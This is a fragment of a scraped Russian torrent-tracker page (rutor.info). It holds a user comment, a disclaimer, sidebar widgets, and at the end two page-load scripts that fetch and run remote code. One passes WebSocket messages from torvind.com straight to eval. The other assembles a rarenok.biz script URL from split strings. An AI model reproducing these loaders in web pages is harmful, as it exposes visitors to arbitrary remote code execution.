1.4.0.519</i></span></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>anatoliydn2</b></td> <td>23-04-2014 20:00:49 (49 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2137640"></span><script type="text/javascript">cOptions(598960,2137640);</script></td></tr><tr><td class="c_t" colspan=4>Пригодно к использованию вместо любого антивиря-фаервола-другой хрени..;...</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
